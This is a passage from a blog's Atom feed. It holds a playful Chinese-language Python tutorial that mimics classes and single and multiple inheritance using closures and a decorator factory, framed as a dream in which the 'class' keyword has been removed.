class="line">g1()</span><br><span class="line">g2()</span><br><span class="line">g2()</span><br><span class="line">g2()</span><br></pre></td></tr></table></figure><p>上述代码的输出如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure><p>可以看到，<code>g1</code>和<code>g2</code>各自维护住了自己所在上下文中的<code>a</code>的值，并且没有产生干扰。基于闭包的这个特点，我们可以实现一个简单的类。</p><h3 id="第二步造一个简单的类"><a class="markdownIt-Anchor" href="#第二步造一个简单的类"></a> 第二步！造一个简单的类</h3><p>通过上面的例子可以看到，通过一个函数返回其内部的函数对象就可以简单地构造出一个闭包。因此，我们先搭好框架。比如我们模拟一个<code>Dog</code>类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Dog</span>(<span class="params">name: <span class="built_in">str</span>, age: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">this</span>():</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> this</span><br></pre></td></tr></table></figure><p>上述就是一个极其简单的闭包。通过进行函数调用：<code>dog = Dog(&quot;Doge&quot;, 5)</code>，我们拿到了<code>Dog()</code>返回的一个函数对象；又由于闭包的性质，该函数对象外层环境中的局部变量<code>name</code>和<code>age</code>又会被维持住，这就构成了一个简单的闭包。</p><p>类一般都具有一部分成员函数，或者称为对象的方法。在这里我们也可以这样做。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Person</span>(<span class="params">name: <span class="built_in">str</span>, age: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">self</span>():</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">to_string</span>():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Person(name = <span class="subst">&#123;name&#125;</span>, age = <span class="subst">&#123;age&#125;</span>)&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_name</span>():</span><br><span class="line">        <span class="keyword">return</span> name</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_age</span>():</span><br><span class="line">        <span class="keyword">return</span> age</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_age</span>(<span class="params">new_age: <span class="built_in">int</span></span>):</span><br><span class="line">        <span class="keyword">nonlocal</span> age</span><br><span class="line">        age = new_age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_name</span>(<span class="params">new_name: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">nonlocal</span> name</span><br><span class="line">        name = new_name</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">self</span>.to_string = to_string</span><br><span class="line">    <span class="variable language_">self</span>.get_name = get_name</span><br><span class="line">    <span class="variable language_">self</span>.get_age = get_age</span><br><span class="line">    <span class="variable language_">self</span>.set_name = set_name</span><br><span class="line">    <span class="variable language_">self</span>.set_age = set_age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">self</span></span><br></pre></td></tr></table></figure><p>首先，我们不使用<code>this</code>而改为<code>self</code>，这符合我们在Python中一贯的使用习惯。同时，我们声明一系列的方法，包括<code>set_name</code>、<code>get_name</code>等。为了便于调用，我们将这些方法的函数对象绑定到<code>self</code>上，这样，我们就可以使用<code>person.get_name()</code>来进行调用了。简单使用一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p1 = Person(<span class="string">&quot;John&quot;</span>, <span class="number">30</span>)</span><br><span class="line"><span class="built_in">print</span>(p1.to_string())</span><br><span class="line"><span class="built_in">print</span>(p1.get_name())</span><br><span class="line"><span class="built_in">print</span>(p1.get_age())</span><br><span class="line">p1.set_name(<span class="string">&quot;Alice&quot;</span>)</span><br><span class="line">p1.set_age(<span class="number">25</span>)</span><br><span class="line"><span class="built_in">print</span>(p1.to_string())</span><br></pre></td></tr></table></figure><p>其结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Person(name = John, age = 30)</span><br><span class="line">John</span><br><span class="line">30</span><br><span class="line">Person(name = Alice, age = 25)</span><br></pre></td></tr></table></figure><p>哦吼！初具雏形。这还需要<code>class</code>关键字干嘛？想到这里，我端起电脑旁的盐汽水，微微抿了一口。 <psw>（至于为什么只是抿了一口，那当然是因为优雅）</psw>这时，一个声音在我耳畔响起：</p><p>“你这算什么？不能继承的类也能叫类？”</p><p>“你再骂！”</p><p>话虽这么说，但是没有继承的类就像没有醋的饺子，总是缺少了一点灵魂的。</p><h3 id="第三步灵魂继承浇给"><a class="markdownIt-Anchor" href="#第三步灵魂继承浇给"></a> 第三步！灵魂继承，浇给</h3><p>我们先拿到两个类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Animal</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">    <span class="variable language_">self</span>.name = kwargs.get(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Unknown&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">to_string</span>():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Animal(name = <span class="subst">&#123;self.name&#125;</span>)&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.to_string = to_string</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">self</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Dog</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">    <span class="variable language_">self</span>.age = kwargs.get(<span class="string">&quot;age&quot;</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">to_string</span>():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Dog(name = <span class="subst">&#123;self.name&#125;</span>, age = <span class="subst">&#123;self.age&#125;</span>)&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.to_string = to_string</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">self</span></span><br></pre></td></tr></table></figure><p>这两个类都符合我们定义的最基础的类，这里就不多解释了。至于我们为何需要格外加一个<code>self</code>的形参，其在继承中将会起到一个重要的作用。这个例子中，<code>Dog</code>类需要继承<code>Animal</code>类，包括父类的成员变量和成员函数。因此，我们需要对<code>Dog</code>类进行改写。</p><p>一种显然的方法是修改<code>Dog</code>类的内部逻辑，使之接受到<code>self</code>形参对应的<code>Animal</code>实例后，依次继承其中的成员变量和成员函数。但这种做法太过臃肿了：如果我们还需要定义一个<code>Cat</code>类，我们是不是也要这要修改<code>Cat</code>类内部呢？这两部分代码是不是几乎一模一样呢？如果我们修改了基类<code>Animal</code>的成员变量，那么我们是不是要修改所有继承自<code>Animal</code>类的类定义呢？</p><p>好在，Python中的<strong>装饰器</strong>能够帮我们进行这部分的代码复用。我们使用<code>@extend()</code>装饰器来表达<strong>继承</strong>这类关系，因此上述类定义可以改写成：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@extend(<span class="params"><span class="literal">None</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Animal</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">    <span class="variable language_">self</span>.name = kwargs.get(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Unknown&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">to_string</span>():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Animal(name = <span class="subst">&#123;self.name&#125;</span>)&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.to_string = to_string</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">self</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@extend(<span class="params">Animal</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Dog</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">    <span class="variable language_">self</span>.age = kwargs.get(<span class="string">&quot;age&quot;</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">to_string</span>():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Dog(name = <span class="subst">&#123;self.name&#125;</span>, age = <span class="subst">&#123;self.age&#125;</span>)&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.to_string = to_string</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">self</span></span><br></pre></td></tr></table></figure><p>其中，<code>@extend(None)</code>表示其为基类，不要继承任何类。因此剩下来的工作就是完成<code>@extend</code>的逻辑。</p><h3 id="完成装饰器生成器extend"><a class="markdownIt-Anchor" href="#完成装饰器生成器extend"></a> 完成装饰器生成器<code>extend</code></h3><p>可以看到，<code>@extend(None)</code>和<code>@extend(Animal)</code>才是装饰器，因此<code>extend</code>只是一个<strong>装饰器生成器</strong>而已，其应该返回一个装饰器。我们先搭建出大致框架：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">extend</span>(<span class="params">super_cls</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorator</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decorator</span><br></pre></td></tr></table></figure><p>装饰器<code>decorator</code>的参数是子类<code>cls</code>，返回值应该是被装饰过后的子类，其也是一个类，因此我们继续完善上述代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">extend</span>(<span class="params">super_cls</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorator</span>(<span class="params">cls</span>):</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">decorated_cls</span>():</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> decorated_cls</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decorator</span><br></pre></td></tr></table></figure><p>首先，我们需要确定被装饰子类<code>decorated_cls</code>的形参列表。在面向对象编程中，我们初始化子类并不需要传入父类实例，因此，<code>self</code>肯定是多余的形参。因此我们能够确定，返回的被装饰子类形参列表必然不存在<code>self</code>，即<code>decorated_cls(*args, **kwargs)</code>。</p><p>那么接下来的逻辑是，我们如何处理原本定义中的<code>self</code>形参？显然，这依赖于该类所继承的父类。如果该类本身没有父类（即基类），那么<code>self</code>显然是空对象；反之，<code>self</code>对应的就是使用参数列表所初始化的父类对象。完成上述逻辑即：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">extend</span>(<span class="params">super_cls</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorator</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">decorated_cls</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">            <span class="comment"># 对应基类情况</span></span><br><span class="line">            <span class="keyword">if</span> super_cls <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span> cls(<span class="keyword">lambda</span>: ..., *args, **kwargs)</span><br><span class="line">            <span class="comment"># 对应子类情况</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                super_obj = super_cls(*args, **kwargs)</span><br><span class="line">                <span class="keyword">return</span> cls(super_obj, *args, **kwargs)</span><br><span class="line">            </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> decorated_cls</span><br><span class="line">    <span class="keyword">return</span> decorator</span><br></pre></td></tr></table></figure><p>因此，完整的定义即：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">extend</span>(<span class="params">super_cls</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorator</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">decorated_cls</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">            <span class="keyword">if</span> super_cls <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span> cls(<span class="keyword">lambda</span>: ..., *args, **kwargs)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                super_obj = super_cls(*args, **kwargs)</span><br><span class="line">                <span class="keyword">return</span> cls(super_obj, *args, **kwargs)</span><br><span class="line">            </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> decorated_cls</span><br><span class="line">    <span class="keyword">return</span> decorator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@extend(<span class="params"><span class="literal">None</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Animal</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">    <span class="variable language_">self</span>.name = kwargs.get(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Unknown&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">to_string</span>():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Animal(name = <span class="subst">&#123;self.name&#125;</span>)&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.to_string = to_string</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">self</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@extend(<span class="params">Animal</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Dog</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">    <span class="variable language_">self</span>.age = kwargs.get(<span class="string">&quot;age&quot;</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">to_string</span>():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Dog(name = <span class="subst">&#123;self.name&#125;</span>, age = <span class="subst">&#123;self.age&#125;</span>)&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.to_string = to_string</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">self</span></span><br></pre></td></tr></table></figure><p>我们测试一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dog = Dog(name=<span class="string">&quot;Buddy&quot;</span>, age=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(dog.to_string())</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dog(name = Buddy, age = 5)</span><br></pre></td></tr></table></figure><p>“嗨，不过如此嘛。”又喝了一口剩下的盐汽水，我长舒一口气。</p><p>“哼哼，你以为就结束了？”</p><p>“不然呢？这个闭包模拟类行为简直是天才想法！”</p><p>“真的吗？”突然，我的眼前出现了这么一行代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@extend(<span class="params">Animal, Runner</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Dog</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>“我要你做出来多继承！！！”</p><p>“啊？？”</p><h3 id="第四步多继承启动"><a class="markdownIt-Anchor" href="#第四步多继承启动"></a> 第四步！多继承，启动！</h3><p>理解上述单继承后，多继承的逻辑只需要在<code>extend</code>中修改即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">extend</span>(<span class="params">*super_cls_list</span>):    <span class="comment"># 此时传入的是一个父类列表</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorator</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">decorated_cls</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">            <span class="comment"># 对应基类情况(基类情况变更为：父类列表长度为零)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(super_cls_list) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> cls(<span class="keyword">lambda</span>: ..., *args, **kwargs)</span><br><span class="line">            <span class="comment"># 对应子类情况</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 依次利用参数列表初始化父类，然后将父类的属性绑定到子类super_obj上</span></span><br><span class="line">                super_obj = <span class="keyword">lambda</span>: ...</span><br><span class="line">                <span class="keyword">for</span> super_cls <span class="keyword">in</span> super_cls_list:</span><br><span class="line">                    cur_obj = super_cls(*args, **kwargs)</span><br><span class="line">                    <span class="keyword">for</span> k,v <span class="keyword">in</span> cur_obj.__dict__.items():</span><br><span class="line">                        <span class="keyword">if</span> <span class="keyword">not</span> k.startswith(<span class="string">&quot;__&quot;</span>):</span><br><span class="line">                            <span class="built_in">setattr</span>(super_obj, k, v)</span><br><span class="line">                <span class="comment"># 最后利用super_obj初始化self</span></span><br><span class="line">                <span class="keyword">return</span> cls(super_obj, *args, **kwargs)</span><br><span class="line">            </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> decorated_cls</span><br><span class="line">    <span class="keyword">return</span> decorator</span><br></pre></td></tr></table></figure><div class="tag-plugin colorful note" color="blue"><div class="title">注意</div><div class="body"><p>此时需要对<code>extend</code>用法稍作修改：对于基类，不再需要传入<code>None</code>；对于子类，需要传入父类列表而不是以逗号隔开的多个参数</p></div></div><p>完整代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">extend</span>(<span class="params">*super_cls_list</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorator</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">decorated_cls</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(super_cls_list) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> cls(<span class="keyword">lambda</span>: ..., *args, **kwargs)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                super_obj = <span class="keyword">lambda</span>: ...</span><br><span class="line">                <span class="keyword">for</span> super_cls <span class="keyword">in</span> super_cls_list:</span><br><span class="line">                    temp_obj = super_cls(*args, **kwargs)</span><br><span class="line">                    <span class="keyword">for</span> k,v <span class="keyword">in</span> temp_obj.__dict__.items():</span><br><span class="line">                        <span class="keyword">if</span> <span class="keyword">not</span> k.startswith(<span class="string">&quot;__&quot;</span>):</span><br><span class="line">                            <span class="built_in">setattr</span>(super_obj, k, v)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> cls(super_obj, *args, **kwargs)</span><br><span class="line">            </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> decorated_cls</span><br><span class="line">    <span class="keyword">return</span> decorator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@extend()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Animal</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">    <span class="variable language_">self</span>.name = kwargs.get(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Unknown&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">to_string</span>():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Animal(name = <span class="subst">&#123;self.name&#125;</span>)&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.to_string = to_string</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">self</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@extend()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Runner</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">    <span class="variable language_">self</span>.speed = kwargs.get(<span class="string">&quot;speed&quot;</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">to_string</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span> is running with speed <span class="subst">&#123;self.speed&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.to_string = to_string</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">self</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@extend(<span class="params">*[Animal, Runner]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Dog</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">    <span class="variable language_">self</span>.age = kwargs.get(<span class="string">&quot;age&quot;</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">to_string</span>():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Dog(name = <span class="subst">&#123;self.name&#125;</span>, age = <span class="subst">&#123;self.age&#125;</span>, speed = <span class="subst">&#123;self.speed&#125;</span>)&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.to_string = to_string</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">self</span></span><br></pre></td></tr></table></figure><p>试验一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dog = Dog(name=<span class="string">&quot;Buddy&quot;</span>, age=<span class="number">5</span>, speed=<span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span>(dog.to_string())</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dog(name = Buddy, age = 5, speed = 20)</span><br></pre></td></tr></table></figure><h2 id="后记"><a class="markdownIt-Anchor" href="#后记"></a> 后记</h2><p>“小小的<code>class</code>关键字，居然要考虑这么多。”忙活了这么久，终于可以喝完这瓶盐汽水了。</p><p>“不对啊，这盐汽水喝不完啊！”</p><p>突然，梦醒了。一如既往地打开电脑和VSCode，输入<code>class</code>关键字。</p><p>“好像？都是一场梦？”</p><p>“哈哈哈哈，”古怪的声音再次响起，“但你学会了不少新东西，不是吗？”这声音又一次离去了，只不过这次再未出现过。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;“欸？为什么我的编辑器给我的&lt;code&gt;class&lt;/code&gt;标红了啊？？？”&lt;/p&gt;
&lt;p&gt;“你不知道吗？Python的新版本移除了&lt;code&gt;class&lt;/code&gt;关键字啊？”&lt;/p&gt;
&lt;p&gt;“啊？？？”&lt;/p&gt;</summary>
    
    
    
    <category term="程序设计" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    <category term="语言" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="Python" scheme="https://blog.snowflake.zone/tags/Python/"/>
    
    <category term="整活向" scheme="https://blog.snowflake.zone/tags/%E6%95%B4%E6%B4%BB%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>后量子加密算法系列预告</title>
    <link href="https://blog.snowflake.zone/posts/20/"/>
    <id>https://blog.snowflake.zone/posts/20/</id>
    <published>2024-03-30T13:37:31.000Z</published>
    <updated>2024-03-30T13:37:31.000Z</updated>
    
